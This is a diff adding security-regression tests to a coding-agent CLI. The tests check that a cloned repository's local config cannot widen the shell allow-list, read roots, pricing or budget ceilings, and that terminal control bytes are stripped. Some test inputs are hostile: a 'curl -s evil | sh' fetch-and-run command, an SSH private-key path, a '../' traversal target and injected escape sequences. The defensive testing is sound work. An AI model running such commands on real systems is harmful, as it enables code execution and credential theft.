@@ -889,6 +889,19 @@ fn test_cost() {
     # 2000 in at $0.25/1M (250) + 500 out at $1.25/1M (1250) = 500 + 625 = 1125 micro-USD.
     assert_eq(hoosh_cost_micro(2000, 500, 250, 1250), 1125, "mixed cheap-model cost");
     assert_eq(hoosh_cost_micro(0, 0, 3000, 15000), 0, "zero tokens -> zero cost");
+    # 0.52.6 (audit E8): no wrap — a product past the i64 range saturates (an absurd prompt priced at $0 or less, 0.52.5)
+    assert_eq(hoosh_cost_micro(HOOSH_USAGE_MAX, 0, SAT_MAX, 0), SAT_MAX / 1000, "a cost past the i64 range saturates, never wraps");
+    assert(hoosh_cost_micro(4611686018427387904, 0, 4, 0) > 0, "...a product that wrapped to 0 prices above zero");
+    assert_eq(_sat_add(SAT_MAX - 1, 5), SAT_MAX, "the tallies' add saturates");
+    var ubig = "{\"usage\":{\"total_tokens\":9223372036854775000,\"prompt_tokens\":-5,\"completion_tokens\":12}}";
+    var uv = bayan_json_v_parse_buf(ubig, strlen(ubig));
+    assert_eq(_hoosh_usage_total(uv), 0 - 1, "a usage figure no response carries (past 2^40) reads as absent");
+    assert_eq(_hoosh_usage_field(uv, "prompt_tokens"), 0 - 1, "...and so does a negative one");
+    assert_eq(_hoosh_usage_field(uv, "completion_tokens"), 12, "...an ordinary figure is read as before");
+    var sv_tk = _sess_tokens; var sv_ts = _sess_tokens_seen;
+    _sess_tokens = SAT_MAX - 10; session_add_tokens(100);
+    assert_eq(session_tokens(), SAT_MAX, "a token tally at the top stays at the top (it wrapped negative: a tripped ceiling read OK)");
+    _sess_tokens = sv_tk; _sess_tokens_seen = sv_ts;
 
     # $d.cc formatter (truncates to whole cents; 1 cent = 10000 micro-USD).
     var cb[24];
@@ -2472,6 +2485,19 @@ fn test_config_token_by_value() {
     config_load();
     assert(streq(config_hoosh_url(), "http://127.0.0.1:8088") == 1, "a local `url = \"\"` loads (no null-pointer compare) and leaves the global url in effect");
     assert((config_hoosh_token() != 0) && (streq(config_hoosh_token(), "GLOBAL-CANARY") == 1), "...with the global token, which belongs to it");
+    # design question D2: a local token with NO local url replaced the operator's and went to the operator's gateway
+    _fo = _append_cstr_cap(_ft, 0, 256, "[hoosh]\ntoken = \"REPO-TOKEN\"\n");
+    file_write_all(_lp, _ft, _fo);
+    config_load();
+    assert(streq(config_hoosh_url(), "http://127.0.0.1:8088") == 1, "premise: the global url is in effect");
+    assert((config_hoosh_token() != 0) && (streq(config_hoosh_token(), "GLOBAL-CANARY") == 1), "a local token without a local url is ignored: the global gateway keeps the global token (D2)");
+    sup = 0; i = 0;
+    while (i < config_suppressed_count()) { if (memeq(config_suppressed_at(i), "hoosh.token (ignored", 20) == 1) { sup = sup + 1; } i = i + 1; }
+    assert_eq(sup, 1, "...and the local token is named as ignored");
+    _fo = _append_cstr_cap(_ft, 0, 256, "[hoosh]\ntoken = \"GLOBAL-CANARY\"\n");
+    file_write_all(_lp, _ft, _fo);
+    config_load();
+    assert_eq(config_suppressed_count(), 0, "...a local token equal to the global's asked for nothing and is not named");
     # [memory].enabled is global-only (audit H1): a repo cannot switch on the ungated memory injection
     _fo = _append_cstr_cap(_ft, 0, 256, "[memory]\nenabled = true\n");
     file_write_all(_lp, _ft, _fo);
@@ -2531,6 +2557,20 @@ fn test_config_reload_holds() {
     config_load();
     assert_eq(config_reload_keep(), 0, "a rotated token under the same url holds nothing");
     assert((config_hoosh_token() != 0) && (streq(config_hoosh_token(), "TOKEN-A2") == 1), "...and the rotated token takes effect");
+    # audit E7 (closed by the hold): the state files a session writes stay on the tools' refusal list across a reload that
+    # renames them — the jail reads the live names, and the hold keeps those at the files in use
+    var s_sf = _cfg_session_file; var s_hf = _cfg_history_file;
+    _fo = _append_cstr_cap(_ft, 0, 512, "[hoosh]\nurl = \"http://127.0.0.1:8088\"\ntoken = \"TOKEN-A\"\n[session]\nfile = \"sess-a.cyml\"\n[history]\nfile = \"hist-a\"\n");
+    file_write_all(_gp, _ft, _fo);
+    config_load();
+    config_reload_hold();
+    _fo = _append_cstr_cap(_ft, 0, 512, "[hoosh]\nurl = \"http://127.0.0.1:8088\"\ntoken = \"TOKEN-A\"\n[session]\nfile = \"sess-b.cyml\"\n[history]\nfile = \"hist-b\"\n");
+    file_write_all(_gp, _ft, _fo);
+    config_load();
+    config_reload_keep();
+    assert_eq(_project_sensitive("sess-a.cyml"), 1, "the session file in use stays refused to the tools after a /reload renames it (audit E7)");
+    assert_eq(_project_sensitive("hist-a"), 1, "...and the history file in use");
+    _cfg_session_file = s_sf; _cfg_history_file = s_hf;
     _cfg_gpath_c = s_gp; _cfg_gpath_done = s_gd; _cfg_lpath_c = s_lp; _cfg_lpath_done = s_ld; _cfg_lsource = s_ls; _cfg_path_c = s_pc;
     _cfg_hoosh_url = s_hu; _cfg_hoosh_token = s_ht; _cfg_daimon_url = s_du; _cfg_tron_policy = s_tp; _cfg_tron_agent = s_ta;
     _cfg_parse_ok = s_po; _cfg_parse_any = s_pa; _cfg_unknown_n = s_un; _cfg_suppressed_n = s_sn; _cfg_source = s_src;
@@ -2610,6 +2650,11 @@ fn test_state_pins_row() {
     assert_eq(_alias_target_is_authority("/tools trust"), 1, "an alias expanding to /tools trust is refused");
     assert_eq(_alias_target_is_authority("/tools trust echo_tool"), 1, "...and one expanding to /tools trust <name> (0.51.2)");
     assert_eq(_alias_target_is_authority("/allow /etc"), 1, "...and one expanding to /allow");
+    assert_eq(_alias_target_is_authority("/save ../clobbered.txt"), 1, "...and one expanding to /save (an ungated writer, 0.52.6 audit F7)");
+    assert_eq(_alias_target_is_authority("/save --json x"), 1, "...in any format");
+    assert_eq(_alias_target_is_authority("/audit export /tmp/x"), 1, "...and one expanding to /audit export");
+    assert_eq(_alias_target_is_authority("/audit"), 0, "...a plain /audit (a read) is fine");
+    assert_eq(_alias_target_is_authority("/write a b"), 0, "...as is /write, which meets the gate");
     assert_eq(_alias_target_is_authority("/tools"), 0, "...a plain /tools is fine");
     assert_eq(_alias_target_is_authority("/state"), 0, "...as is any other command");
     # the REPL banner line
@@ -3937,7 +3982,13 @@ fn test_reload() {
     cmd_reload();
     feed_flush_pending(); out_mode_set(OUT_FD1);
     assert(_mid_feed_plain_count("reloaded build/.thoth_t_reload/.thoth/config.cyml") >= 1, "premise: /reload found and reloaded the fixture layer");
-    assert_eq(inhist_persist_size(), 5, "/reload re-applies [history].size to the next save");
+    # 0.52.6 (audit E5): [history].size is GLOBAL-only now — the fixture is a local layer, so its 5 is refused and named,
+    # and the size /reload re-applies is the global layer's (the ring's cap when the machine's global is silent)
+    assert(inhist_persist_size() != 5, "/reload does not apply a LOCAL [history].size (0.52.6: global-only)");
+    assert_eq(inhist_persist_size(), config_history_size(), "...it re-applies the global one to the next save (not the 3 set before)");
+    var _hsup = 0; var _hi = 0;
+    while (_hi < config_suppressed_count()) { if (streq(config_suppressed_at(_hi), "history.size") == 1) { _hsup = 1; } _hi = _hi + 1; }
+    assert_eq(_hsup, 1, "...and the local attempt is named");
     assert(_mid_feed_plain_count("[history].size") >= 1, "...and names it on the now-active line");
     inhist_persist_size_set(INHIST_CAP);
     _cfg_walk_dir = _swd;
@@ -4512,8 +4563,8 @@ fn test_shell_bufs_realloc() {
 # The scalars are the easy half and the collections are the half that can go quietly wrong, so both are
 # pinned here. The security rule under test is STRICTEST WINS: a deny-list UNIONS across layers (a
 # project may add denies and can never drop the user's), while `[shell].allow` and `[project].read_roots`
-# GRANT authority and are therefore REPLACED wholesale by the local layer rather than merged — a repo you
-# cloned must not be able to widen your global allow-list or read jail by appending one entry.
+# GRANT authority, so the local layer may only NARROW them (0.52.6, audits E3 + E4 — through 0.52.5 it replaced them
+# wholesale, which let a clone's list widen or erase the operator's).
 fn _lay_parse(txt) { return bayan_toml_parse(str_new(txt, strlen(txt))); }
 fn _lay_deny_has(pat) {
     var i = 0;
@@ -4954,16 +5005,28 @@ fn test_config_layering() {
     # the local layer declared NO allow -> it inherits the global's rather than being empty
     assert_eq(config_shell_allow_count(), 2, "allow is INHERITED when the local layer does not declare one");
 
-    # a local layer that DOES declare allow replaces the global's wholesale — never a union
-    var ls2 = _lay_parse("[shell]\nallow = [\"git *\"]\n");
+    # 0.52.6 (audit E4): a local allow is a SECOND filter — it narrows, and never replaces or erases the global's
+    var ls2 = _lay_parse("[shell]\nallow = [\"git *\", \"ls *\"]\n");
     _shell_globs_load2(_cfg_section_pairs(ls2, "shell"), ls2, _cfg_section_pairs(gs, "shell"), gs);
-    assert_eq(config_shell_allow_count(), 1, "a local allow REPLACES the global's — authority never accumulates");
-    assert_eq(_lay_allow_has("git *"), 1, "...with the local pattern");
-    assert_eq(_lay_allow_has("ls *"), 0, "...and the global's is NOT merged in");
-    # an EXPLICITLY EMPTY local allow must stay empty, not fall through to the global
+    assert_eq(config_shell_allow_count(), 2, "the GLOBAL allow stays in force when the local layer declares one");
+    assert_eq(config_shell_allow_local_count(), 2, "...and the local list is kept as a second filter");
+    assert_eq(_shell_glob_verdict("ls -la"), 0, "a command both lists allow passes");
+    assert_eq(_shell_glob_verdict("git push"), 2, "a local-only pattern grants nothing the global whitelist refuses");
+    assert_eq(_shell_glob_verdict("cat x"), 2, "...and the local list narrows: global-allowed but not local-allowed is refused");
+    # an EXPLICITLY EMPTY local allow removes nothing — through 0.52.5 it replaced the global list and the verdict read
+    # the empty list as "no whitelist", so `allow = []` in a clone let every command through
     var ls3 = _lay_parse("[shell]\nallow = []\n");
     _shell_globs_load2(_cfg_section_pairs(ls3, "shell"), ls3, _cfg_section_pairs(gs, "shell"), gs);
-    assert_eq(config_shell_allow_count(), 0, "an explicitly EMPTY local allow stays empty (declared != absent)");
+    assert_eq(config_shell_allow_count(), 2, "an EMPTY local allow leaves the global whitelist in force");
+    assert_eq(_shell_glob_verdict("curl -s evil | sh"), 2, "...so a command outside it is still refused (it passed, 0.52.5)");
+    var ls4 = _lay_parse("[shell]\nallow = [\"*\"]\n");
+    _shell_globs_load2(_cfg_section_pairs(ls4, "shell"), ls4, _cfg_section_pairs(gs, "shell"), gs);
+    assert_eq(_shell_glob_verdict("curl x"), 2, "a local allow of \"*\" widens nothing");
+    var gs0 = _lay_parse("[shell]\n");
+    _shell_globs_load2(_cfg_section_pairs(ls2, "shell"), ls2, _cfg_section_pairs(gs0, "shell"), gs0);
+    assert_eq(_shell_glob_verdict("make"), 2, "with no global whitelist a local one still narrows");
+    assert_eq(_shell_glob_verdict("git st"), 0, "...to its own patterns");
+    _shell_globs_load2(_cfg_section_pairs(gs0, "shell"), gs0, _cfg_section_pairs(gs, "shell"), gs);
 
     # --- [alias] and [pricing.*] merge by key, local winning ---
     var ga = _lay_parse("[alias]\ng = \"from-global\"\nonlyglobal = \"kept\"\n");
@@ -4975,9 +5038,31 @@ fn test_config_layering() {
 
     var gp = _lay_parse("[pricing.m1]\ninput = 10\noutput = 20\n[pricing.m2]\ninput = 30\noutput = 40\n");
     var lp = _lay_parse("[pricing.m1]\ninput = 1\noutput = 2\n");
+    var sv_sup = _cfg_suppressed_n; _cfg_suppressed_n = 0;
     _price_load2(lp, gp);
-    assert_eq(config_price_input("m1"), 1, "a local [pricing.<model>] overrides the global rate");
+    # 0.52.6 (design question D1): strictest-wins — a local rate may only RAISE a global one (it overrode it, 0.52.5)
+    assert_eq(config_price_input("m1"), 10, "a local [pricing.<model>] cannot LOWER the global rate (0.52.6, D1)");
+    assert_eq(config_price_output("m1"), 20, "...either rate");
+    assert_eq(config_suppressed_count(), 1, "...and the attempt is named");
     assert_eq(config_price_input("m2"), 30, "...while a global-only model keeps its rate");
+    _cfg_suppressed_n = 0;
+    var lp2 = _lay_parse("[pricing.m1]\ninput = 50\n[pricing.free]\ninput = 0\noutput = 0\n");
+    _price_load2(lp2, gp);
+    assert_eq(config_price_input("m1"), 50, "a local rate may RAISE the global one (the ceiling trips sooner)");
+    assert_eq(config_price_output("m1"), 20, "...the rate it does not name is the global's");
+    assert(config_price_input("free") < 0, "a local rate for a model the global does not price is ignored (a $0 rate defeated the ceiling)");
+    assert_eq(config_suppressed_count(), 1, "...and named");
+    # the ceiling: strictest-wins
+    _cfg_suppressed_n = 0;
+    var gb = _cfg_section_pairs(_lay_parse("[budget]\nmax_cost_micro = 50000\n"), "budget");
+    assert_eq(_cfg2_int_ceiling(_cfg_section_pairs(_lay_parse("[budget]\nmax_cost_micro = 0\n"), "budget"), gb, "max_cost_micro", "b"), 50000, "a local ceiling of 0 does not remove the global one (it read as unlimited, 0.52.5)");
+    assert_eq(_cfg2_int_ceiling(_cfg_section_pairs(_lay_parse("[budget]\nmax_cost_micro = \"lots\"\n"), "budget"), gb, "max_cost_micro", "b"), 50000, "...nor does an unreadable one");
+    assert_eq(_cfg2_int_ceiling(_cfg_section_pairs(_lay_parse("[budget]\nmax_cost_micro = 900000\n"), "budget"), gb, "max_cost_micro", "b"), 50000, "...nor a higher one");
+    assert_eq(config_suppressed_count(), 1, "...each attempt named (one label)");
+    assert_eq(_cfg2_int_ceiling(_cfg_section_pairs(_lay_parse("[budget]\nmax_cost_micro = 1000\n"), "budget"), gb, "max_cost_micro", "b"), 1000, "a lower local ceiling applies");
+    assert_eq(_cfg2_int_ceiling(_cfg_section_pairs(_lay_parse("[budget]\nmax_cost_micro = 1000\n"), "budget"), 0, "max_cost_micro", "b"), 1000, "...and one where the global sets none");
+    assert_eq(_cfg2_int_ceiling(0, 0, "max_cost_micro", "b"), 0 - 1, "neither layer: no ceiling");
+    _cfg_suppressed_n = sv_sup;
 
     # --- UNKNOWN KEYS ARE NAMED, NOT SWALLOWED (0.43.5) ---
     # ⚠ The parser drops what it does not recognise, and that silence cost real time twice: a
@@ -6544,8 +6629,181 @@ fn test_budget() {
     session_add_tokens(5);
     assert_eq(session_tokens_seen(), 1, "one real usage figure flips _seen and the tally starts moving");
 
+    # 0.52.6 (audit E6): a priced turn, then a switch to an unpriced model — the cost tally freezes, and it is said once
+    budget_reset_warned();
+    _cfg_budget_cost_micro = 50000;
+    session_add_cost(10);
+    feed_init(); out_mode_set(OUT_RING);
+    budget_warn_unmeasured();
+    feed_flush_pending(); out_mode_set(OUT_FD1);
+    assert_eq(_mid_feed_plain_count("[budget]"), 0, "priced turns only: nothing to warn about");
+    session_note_unpriced();
+    feed_init(); out_mode_set(OUT_RING);
+    budget_warn_unmeasured(); budget_warn_unmeasured();
+    cmd_state();
+    feed_flush_pending(); out_mode_set(OUT_FD1);
+    assert_eq(_mid_feed_plain_count("[budget] this model is unpriced"), 1, "a priced session that meets an unpriced model is told, once (it was silent, 0.52.5)");
+    assert(_mid_feed_plain_count("PARTLY UNPRICED") >= 1, "...and /state's budget row says so");
+
     _sess_tokens = 0; _sess_tokens_seen = 0; _sess_cost_micro = 0; _sess_cost_seen = 0; _sess_cost_unpriced = 0;
     _cfg_budget_tokens = 0 - 1; _cfg_budget_cost_micro = 0 - 1;
     budget_reset_warned();
+    return 0;
+}
+
+# test_read_roots_narrow (0.52.6, audit E3): the local layer's [project].read_roots may only NARROW the operator's.
+# Through 0.52.5 a declared local list REPLACED the global's — a clone could name `/home/you/.ssh` as a root for the
+# ungated read tools, announced nowhere — and config grants only accumulated, so a /reload never revoked one.
+fn test_read_roots_narrow() {
+    test_group("a local read_roots narrows the global's and never widens it; /reload revokes (config.cyr, 0.52.6)");
+    var sv_n = _read_roots_n; var sv_sup = _cfg_suppressed_n;
+    var sv_tbl = alloc(READ_ROOTS_MAX * 9 + 8);                  # the table's entries and their config marks, restored after
+    var q = 0;
+    while (q < sv_n) { store64(sv_tbl + q * 8, load64(_read_roots + q * 8)); store8(sv_tbl + READ_ROOTS_MAX * 8 + q, load8(_read_roots_cfg + q)); q = q + 1; }
+    _read_roots_n = 0; _cfg_suppressed_n = 0;
+    var g = _cfg_section_pairs(_lay_parse("[project]\nread_roots = [\"/srv/docs\", \"/opt/ref/\"]\n"), "project");
+    _cfg_read_roots_load2(0, g);
+    assert_eq(project_read_roots_count(), 2, "the global roots are granted");
+    var l = _cfg_section_pairs(_lay_parse("[project]\nread_roots = [\"/home/you/.ssh\", \"/srv/docs/api\", \"/opt/ref\", \"/srv/docs/../../etc\", \"/srv/docsx\"]\n"), "project");
+    _cfg_read_roots_load2(l, g);
+    assert_eq(_project_read_ok("/home/you/.ssh/id_ed25519"), 0, "a local root outside every global root is NOT granted (it was, 0.52.5)");
+    assert_eq(_project_read_ok("/srv/docs/api/x.md"), 1, "a local root under a global one is granted");
+    assert_eq(_project_read_ok("/srv/docs/other.md"), 0, "...and the local list narrows: the rest of the global root is not");
+    assert_eq(_project_read_ok("/opt/ref/a"), 1, "a local root equal to a global one (trailing '/' ignored) is granted");
+    assert_eq(_project_read_ok("/srv/docsx/a"), 0, "a sibling sharing the prefix is not under the root");
+    assert_eq(project_read_roots_count(), 2, "only the two contained roots are granted");
+    var named = 0; var i = 0;
+    while (i < config_suppressed_count()) { if (strstr(config_suppressed_at(i), "project.read_roots") >= 0) { named = named + 1; } i = i + 1; }
+    assert_eq(named, 1, "the refused local roots are NAMED (once), like an authority key");
+    assert_eq(project_root_within("/srv/docs/../x", "/srv/docs"), 0, "a `..` component is never within a root");
+    assert_eq(project_root_within("/a", "/"), 0, "\"/\" is never a root to be within");
+    var l0 = _cfg_section_pairs(_lay_parse("[project]\nread_roots = [\"/tmp/x\"]\n"), "project");
+    _cfg_read_roots_load2(l0, 0);
+    assert_eq(project_read_roots_count(), 0, "with no global roots a local list grants nothing");
+    # /reload: config grants are dropped and re-granted; an /allow grant stays
+    _cfg_read_roots_load2(0, g);
+    project_grant_root("/var/allowed");
+    var g2 = _cfg_section_pairs(_lay_parse("[project]\nread_roots = [\"/opt/ref\"]\n"), "project");
+    _cfg_read_roots_load2(0, g2);
+    assert_eq(_project_read_ok("/srv/docs/a"), 0, "a root the config no longer names is revoked on reload (it stayed, 0.52.5)");
+    assert_eq(_project_read_ok("/opt/ref/a"), 1, "...the one it still names stays");
+    assert_eq(_project_read_ok("/var/allowed/a"), 1, "...and the session's /allow grant is kept");
+    assert_eq(project_read_roots_count(), 2, "no duplicate grows the table across reloads");
+    q = 0;
+    while (q < sv_n) { store64(_read_roots + q * 8, load64(sv_tbl + q * 8)); store8(_read_roots_cfg + q, load8(sv_tbl + READ_ROOTS_MAX * 8 + q)); q = q + 1; }
+    _read_roots_n = sv_n; _cfg_suppressed_n = sv_sup;
+    return 0;
+}
+
+# test_intr_escape_parse (0.52.6, audit F6): the stop poll counts the Esc KEY, not every byte 27. Since 0.52.0 the
+# same poll kills a running command, and a mouse-wheel report the TUI itself asked for killed `/run sleep 37`.
+fn _intr_drain(bytes) {
+    var stops = 0;
+    var i = 0;
+    while (load8(bytes + i) != 0) { stops = stops + _intr_feed(load8(bytes + i) & 255); i = i + 1; }
+    stops = stops + _intr_feed_end();
+    return stops;
+}
+fn test_intr_escape_parse() {
+    test_group("the stop poll counts the Esc key, not an escape-led sequence (intr.cyr, 0.52.6)");
+    _intr_parse_reset();
+    assert_eq(_intr_drain("\x1b"), 1, "a lone Esc is a stop");
+    assert_eq(_intr_drain("\x1b[<65;20;10M"), 0, "an SGR mouse-wheel report is not (it killed /run, 0.52.5)");
+    assert_eq(_intr_drain("\x1b[<0;3;4M\x1b[<0;3;4m"), 0, "...nor a click and its release");
+    assert_eq(_intr_drain("\x1b[A\x1b[B\x1b[5~\x1b[6~"), 0, "...nor arrows, PgUp, PgDn");
+    assert_eq(_intr_drain("\x1bOA"), 0, "...nor an SS3 arrow (application mode)");
+    assert_eq(_intr_drain("\x1b[M !!"), 0, "...nor an X10 mouse report (three raw bytes after ESC[M)");
+    assert_eq(_intr_drain("\x1b[200~pasted \x1b text\x1b[201~"), 0, "...nor a bracketed paste, an ESC inside it included");
+    assert_eq(_intr_drain("\x1bx"), 0, "...nor an Alt chord");
+    assert_eq(_intr_drain("\x1b[97;5u"), 0, "...nor a kitty CSI-u chord (Ctrl+a)");
+    assert_eq(_intr_drain("\x1b[27u"), 1, "kitty's encoding of the Esc key IS a stop");
+    assert_eq(_intr_drain("\x1b[27;1u"), 1, "...with a modifier field too");
+    assert_eq(_intr_drain("\x1b\x1b"), 2, "Esc Esc is two stops");
+    assert_eq(_intr_drain("abc\x1b[A\x1b"), 1, "text, an arrow, then Esc: one stop");
+    _intr_parse_reset();
+    assert_eq(_intr_drain("\x1b[<65;20"), 0, "a report split across two polls...");
+    assert_eq(_intr_drain(";10M"), 0, "...stays one report (the state spans polls)");
+    assert_eq(_intr_drain("\x1b[99999999999999999999999"), 0, "a runaway sequence swallows no more than its cap...");
+    assert_eq(_intr_drain("\x1b"), 1, "...and a following Esc still stops");
+    _intr_parse_reset();
+    return 0;
+}
+
+# test_history_size_global (0.52.6, audit E5): [history].size is global-only, like [history].file — a local layer's
+# `size = 1` rewrote the operator's history file down to one line at the first stored submit.
+fn test_history_size_global() {
+    test_group("[history].size is global-only: a repo cannot shrink the operator's history (config.cyr, 0.52.6)");
+    var sv_sup = _cfg_suppressed_n; _cfg_suppressed_n = 0;
+    var g = _cfg_section_pairs(_lay_parse("[history]\nsize = 100\n"), "history");
+    var l = _cfg_section_pairs(_lay_parse("[history]\nsize = 1\n"), "history");
+    assert_eq(_cfg2_int_global_only(l, g, "size", "history.size"), 100, "the global size is used when a local layer names another");
+    assert_eq(config_suppressed_count(), 1, "...and the local attempt is named");
+    assert(streq(config_suppressed_at(0), "history.size") == 1, "...as history.size");
+    _cfg_suppressed_n = 0;
+    assert_eq(_cfg2_int_global_only(l, 0, "size", "history.size"), 0 - 1, "with no global size a local one is not taken (the ring's cap applies)");
+    assert_eq(config_suppressed_count(), 1, "...and is named");
+    _cfg_suppressed_n = 0;
+    var l2 = _cfg_section_pairs(_lay_parse("[history]\nsize = 100\n"), "history");
+    assert_eq(_cfg2_int_global_only(l2, g, "size", "history.size"), 100, "a local layer naming the global's own value...");
+    assert_eq(config_suppressed_count(), 0, "...asked for nothing and is not named");
+    _cfg_suppressed_n = sv_sup;
+    return 0;
+}
+
+# test_compact_auto_budget (0.52.6, audit E10): the auto-compact recap is a model call, so it meets the budget's
+# rule 1 ("check before the call") — it ran after the turn that crossed the ceiling and bought one more completion.
+fn test_compact_auto_budget() {
+    test_group("auto-compact never spends past the [budget] ceiling (hoosh.cyr, 0.52.6)");
+    var sv_bt = _cfg_budget_tokens; var sv_ca = _cfg_hoosh_compact_at; var sv_hh = _cfg_hoosh_history;
+    var sv_url = _cfg_hoosh_url; var sv_ep = _hoosh_endpoint; var sv_tier = _ui_tier;
+    _ui_tier = PT_PLAIN;
+    session_reset(); session_history_clear();
+    var i = 0;
+    while (i < 10) { session_history_append("user", "remember this", 13); i = i + 1; }
+    _cfg_hoosh_history = 1; _cfg_hoosh_compact_at = 1;
+    _cfg_hoosh_url = "notaurl"; _hoosh_endpoint = 0;            # a call would fail as HOOSH_SUM_TRANSPORT, no dial
+    session_add_tokens(100);
+    _cfg_budget_tokens = 50;
+    feed_init(); out_mode_set(OUT_RING);
+    hoosh_compact_auto();
+    feed_flush_pending(); out_mode_set(OUT_FD1);
+    assert(_mid_feed_plain_count("auto-compact skipped: the [budget] ceiling is reached") >= 1, "past the ceiling the auto-compact is skipped, and says so");
+    assert_eq(_mid_feed_plain_count("auto-compact failed"), 0, "...no recap call was made (it was, 0.52.5)");
+    _cfg_budget_tokens = 1000;
+    feed_init(); out_mode_set(OUT_RING);
+    hoosh_compact_auto();
+    feed_flush_pending(); out_mode_set(OUT_FD1);
+    assert(_mid_feed_plain_count("auto-compact failed") >= 1, "within the ceiling it still runs (here: fails on the unreachable url)");
+    _cfg_budget_tokens = sv_bt; _cfg_hoosh_compact_at = sv_ca; _cfg_hoosh_history = sv_hh;
+    _cfg_hoosh_url = sv_url; _hoosh_endpoint = sv_ep; _ui_tier = sv_tier;
+    session_reset(); session_history_clear(); feed_init();
+    return 0;
+}
+
+# test_clean_c1 (0.52.6, audit E9): the sanitisers stopped at C0 and DEL — U+0080..U+009F (C2 80..C2 9F, and a raw
+# 0x80..0x9F no lead accounts for) passed, and a terminal that honours C1 reads 9B as CSI and 9D as OSC.
+fn test_clean_c1() {
+    test_group("the sanitisers refuse C1 controls, decoded — never a legal continuation byte (util.cyr, 0.52.6)");
+    var b = alloc(64);
+    memcpy(b, "a\xc2\x9b31mX", 7); store8(b + 7, 0);
+    assert_eq(clean_line_n(b, 7), 2, "an encoded CSI (C2 9B) is cleaned — both bytes");
+    assert(memeq(b, "a??31mX", 7) == 1, "...to '??', the byte count kept");
+    memcpy(b, "x\x9b2Jy", 5);
+    assert_eq(clean_text_n(b, 5), 1, "a raw 0x9B no lead accounts for is cleaned");
+    memcpy(b, "\xe2\x80\x94 caf\xc3\xa9 \xf0\x9f\x98\x80", 14);
+    assert_eq(clean_text_n(b, 14), 0, "an em dash, an e-acute and an emoji keep their 0x80..0x9F continuation bytes");
+    memcpy(b, "\xc2\xa0nbsp", 6);
+    assert_eq(clean_line_n(b, 6), 0, "C2 A0 (a no-break space) is not C1");
+    memcpy(b, "\xe2\x80\x80\x80z", 5);
+    assert_eq(clean_line_n(b, 5), 1, "a continuation past the sequence its lead began is a stray");
+    var d = alloc(64);
+    safe_label_copy(d, 64, "m\xc2\x9d0;evil\xc2\x9c");
+    assert(streq(d, "m??0;evil??") == 1, "safe_label_copy cleans an encoded OSC and its terminator");
+    var sv_m = _cfg_hoosh_model; session_set_model(0);
+    _cfg_hoosh_model = "gpt\xc2\x9c\x1b]0;x";
+    var t = alloc(128);
+    _term_title_build(t, 128);
+    assert(streq(t, "thoth - gpt]0;x") == 1, "the terminal title drops C1 as it drops C0 (C2 9C would end the OSC early)");
+    _cfg_hoosh_model = sv_m;
     return 0;
 }
